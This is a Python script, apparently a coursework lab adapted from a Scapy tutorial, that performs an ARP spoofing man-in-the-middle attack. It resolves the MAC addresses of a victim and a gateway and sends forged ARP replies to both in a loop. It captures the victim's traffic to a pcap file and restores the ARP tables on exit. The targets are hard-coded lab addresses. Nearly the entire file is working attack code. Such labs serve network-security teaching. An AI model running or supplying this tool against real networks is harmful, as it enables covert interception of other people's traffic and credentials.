from multiprocessing import Process
from scapy.all import *

import os
import sys
import time

def get_mac(targetip):
    #this function gets and records the MAC address of the network
    # ADAPTED FROM https://0xbharath.github.io/art-of-packet-crafting-with-scapy/network_attacks/arp_spoofing/index.html
    ans, _ = srp(
                Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = targetip),
                timeout = 2,
                # iface = interface,
                inter = 0.1
                )
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")



class Arper:
    def __init__(self, victim, destination, interface="eth0"):
        #This function initiate the class
        self.victim_ip = victim
        self.gateway_ip = destination

        self.interface = interface
        
        self.victim_mac = get_mac(self.victim_ip)
        self.gateway_mac = get_mac(self.gateway_ip)


    def run(self):
        #this function runs the overall structure of the attack
        self.poison_process = Process(target=self.poison, daemon=True)
        self.sniffer_process = Process(target=self.sniff, daemon=True)

        self.poison_process.start()
        self.sniffer_process.start()
        try:
            self.poison_process.join()
            self.sniffer_process.join()
        except KeyboardInterrupt:
            print("Main process has ended")
            self.restore()


    def poison(self):
        #this function performs the poisoning process
        # FROM https://0xbharath.github.io/art-of-packet-crafting-with-scapy/network_attacks/arp_spoofing/index.html
        # self.restore()
        poision_victim = ARP(
            op = 2,
            # target IP
            pdst = self.victim_ip,
            # Spoofing IP
            psrc = self.gateway_ip,
            hwdst= self.victim_mac)
        poision_gateway = ARP(
            op = 2,
            pdst = self.gateway_ip,
            psrc = self.victim_ip,
            hwdst= self.gateway_mac)
        try:
            while True:
                print('sending poison...')
                send(poision_victim)
                send(poision_gateway)
                time.sleep(5)
        except KeyboardInterrupt:
            # self.restore() # Don't need this as its handled above
            pass

    def sniff(self, count=200):
        FILTER = f"ip host {self.victim_ip}"
        IFACE = self.interface

        sniff(
            iface=IFACE,
            filter=FILTER,
            count=count,
            prn=self.packet_callback_handler
            )

    def packet_callback_handler(self, sniffed_packet):
        wrpcap(
            'sniffed_packets.pcap',
            sniffed_packet,
            append=True
            )
        print("Packet captured and stored in PCAP file!")
        
        # self.read_pcap("sniffed_packets.pcap")

    def read_pcap(self, file_name):
        # Additional method added (not part of coursework)
        packets = rdpcap(file_name)

        for pkt in packets:
            print("Packet Details:")
            print("-----------------")
            try:
                print(pkt.show())
            except:
                continue


    def restore(self):
        # ADAPTED FROM https://0xbharath.github.io/art-of-packet-crafting-with-scapy/network_attacks/arp_spoofing/index.html
        print("\nCTRL+C pressed ... Restoring Targets...")
        send(ARP(
            op = 2,
            psrc = self.victim_ip,
            pdst = self.gateway_ip,
            hwdst = "ff:ff:ff:ff:ff:ff",
            hwsrc = self.victim_mac
            ), count = 7)

        send(ARP(
            op = 2,
            pdst = self.victim_ip,
            psrc = self.gateway_ip,
            hwdst = "ff:ff:ff:ff:ff:ff",
            hwsrc = self.gateway_mac), count = 7)
        print("Shutting Down...")
        os._exit(1)

if __name__ == '__main__':
    # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    (victim, destination, interface) = ("10.9.0.5", "10.9.0.6", "eth0")

    myarp = Arper(victim, destination, interface)
    myarp.run()